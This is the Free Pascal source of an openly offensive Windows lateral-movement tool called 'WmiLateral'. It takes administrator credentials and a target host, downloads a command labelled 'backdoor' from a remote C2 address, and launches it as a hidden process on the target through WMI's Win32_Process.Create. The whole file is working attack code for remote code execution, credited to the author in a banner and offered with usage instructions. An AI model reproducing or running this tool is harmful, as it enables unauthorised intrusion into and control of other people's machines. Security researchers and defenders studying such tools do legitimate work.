program lat;

{$mode objfpc}{$H+}

uses
  {$IFDEF UNIX}
  cthreads,
  {$ENDIF}
  Classes,windows, SysUtils,FPHTTPClient,comobj,activex,variants, openssl,
  opensslsockets,CustApp;

const
HIDDEN_WINDOW       = 0;

type

  { TLaterl }

  TLaterl = class(TCustomApplication)
  protected
    procedure DoRun; override;
  public
    procedure WriteHelp; virtual;
    procedure WMI; virtual;
  end;

{ TLaterl }

procedure TLaterl.DoRun;
var
  ErrorMsg: String;
begin
  // quick check parameters
  ErrorMsg:=CheckOptions('h username password host srvhost', 'help');
  if ErrorMsg<>'' then begin
    ShowException(Exception.Create(ErrorMsg));
    Terminate;
    Exit;
  end;

  // parse parameters
  if HasOption('h', 'help') then begin
    WriteHelp;
    Terminate;
    Exit;
  end;

  { add your program here }
    WMI;
  // stop program loop
  Terminate;
end;


procedure banner;
 var
   s : string;
begin
   s:= '[!] coded by @zux0x3a '#10+'[+] 0xsp SRD '+#10+'[!] https://0xsp.com & https://ired.dev'+#10;
   writeln(s);
end;

function getscript(url:string):string;    // get your script from remote web interface
var
  FPHTTPClient: TFPHTTPClient;
  Resultget : string;
begin
FPHTTPClient := TFPHTTPClient.Create(nil);
FPHTTPClient.AllowRedirect := True;
   try
   Resultget := FPHTTPClient.Get(url); // example https://pastebin.com/raw/wtf50XsX
   getscript := Resultget;
   Writeln('[+] Getting Shell....');
   except
      on E: exception do
         writeln(E.Message);
   end;
FPHTTPClient.Free;

end;

procedure TLaterl.WMI;
var
  FSWbemLocator : OLEVariant;
  FWMIService   : OLEVariant;
  FWbemObject   : OLEVariant;
  objProcess    : OLEVariant;
  objConfig     : OLEVariant;
  ProcessID     : Integer;
  backdoor : OLEVariant;
  username,password,host: OLEVariant;
  srvhost :string;
  i:integer;

begin;
  banner;
  for i := 1 to paramcount do begin

        if(paramstr(i)='-username') then begin
         username := paramstr(i+1);
         writeln('[+] using username : '+'['+username+']'+' to authenticate');
        end;
        if(paramstr(i)='-password') then begin
         password := paramstr(i+1);

        end;
         if(paramstr(i)='-host') then begin
         host := paramstr(i+1);
         writeln('[!] trying to connect to '+host);
        end;
         if (paramstr(i)='-srvhost') then begin
          srvhost := paramstr(i+1);
         end;

         end;




  backdoor := trim(GetScript(srvhost));

  FSWbemLocator := CreateOleObject('WbemScripting.SWbemLocator');
  FWMIService   := FSWbemLocator.ConnectServer(host, 'root\CIMV2', username, password);
  FWbemObject   := FWMIService.Get('Win32_ProcessStartup');
  objConfig     := FWbemObject.SpawnInstance_;

  objConfig.ShowWindow := HIDDEN_WINDOW;
  objProcess    := FWMIService.Get('Win32_Process');
  objProcess.Create(backdoor, null, objConfig, ProcessID);
  Writeln(Format('Pid %d',[ProcessID]));
  writeln('[+] task has been created successfully  ..!');

  end;

procedure TLaterl.WriteHelp;
begin
  { add your help code here }
  writeln('Usage: ', ExeName, ' -host windows10/7/server -srvhost C2C address -username Administrator -password P@ssw0rd ');
end;

var
  Application: TLaterl;
begin
  Application:=TLaterl.Create(nil);
  Application.Title:='WmiLateral';
  Application.Run;
  Application.Free;
end.

